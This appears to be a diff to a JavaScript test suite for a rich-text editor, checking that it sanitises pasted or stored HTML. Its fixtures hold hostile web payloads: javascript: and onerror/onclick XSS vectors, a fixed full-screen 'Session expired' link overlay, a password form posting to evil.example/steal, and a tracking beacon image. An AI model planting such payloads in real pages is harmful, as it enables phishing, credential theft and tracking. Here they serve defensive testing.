@@ -90,8 +90,40 @@ describe('the TextEditor control', () => {
     const box = await screen.findByLabelText('Terms');
     expect(box.querySelector('script')).toBeNull();
     expect(box.querySelector('p')).not.toHaveAttribute('onclick');
-    typeHtml(box, '<p>pasted<img src="x" onerror="alert(3)"></p>');
-    expect(onFieldChange).toHaveBeenLastCalledWith('terms', '<p>pasted<img src="x"></p>');
+    typeHtml(box, '<p>pasted<a href="javascript:alert(3)" onclick="alert(4)">x</a></p>');
+    expect(onFieldChange).toHaveBeenLastCalledWith('terms', '<p>pasted<a>x</a></p>');
+  });
+
+  it('draws no overlay, form or outside image that a writer of the field planted', async () => {
+    const { onFieldChange } = drawField(
+      '<p class="fixed inset-0">terms</p>' +
+        '<a href="https://evil.example/login" style="position:fixed;inset:0;z-index:99999" data-ui="dialog">Session expired</a>' +
+        '<form action="https://evil.example/steal"><input type="password"><button>Sign in</button></form>' +
+        '<img src="https://evil.example/beacon.png">',
+      { readOnly: true },
+    );
+    const box = await screen.findByLabelText('Terms');
+    const link = box.querySelector('a')!;
+    expect(link).toHaveAttribute('href', 'https://evil.example/login');
+    expect(link).not.toHaveAttribute('style');
+    expect(link).not.toHaveAttribute('data-ui');
+    expect(box.querySelector('p')).not.toHaveAttribute('class');
+    expect(box.querySelector('form, input, button, img')).toBeNull();
+    expect(box).toHaveTextContent('terms');
+    typeHtml(box, '<p style="color:red" class="fixed">pasted</p><img src="https://evil.example/beacon.png">');
+    expect(onFieldChange).toHaveBeenLastCalledWith('terms', '<p>pasted</p>');
+  });
+
+  it('keeps the formatting a person writes: blocks, lists, emphasis and links', async () => {
+    const html =
+      '<h2>Terms</h2><p>a <b>b</b> <strong>c</strong> <i>d</i> <em>e</em> <u>f</u> <s>g</s> <code>h</code></p>' +
+      '<div>line</div><ul><li>one</li></ul><ol><li>two</li></ol><blockquote>q</blockquote><pre>p</pre><hr>' +
+      '<p><a href="https://example.com/terms">read</a><br><span>s</span></p>';
+    const { onFieldChange } = drawField(html);
+    const box = await screen.findByLabelText('Terms');
+    expect(box.innerHTML).toBe(html);
+    typeHtml(box, html);
+    expect(onFieldChange).toHaveBeenLastCalledWith('terms', html);
   });
 
   it('refuses editing while it is read-only', async () => {
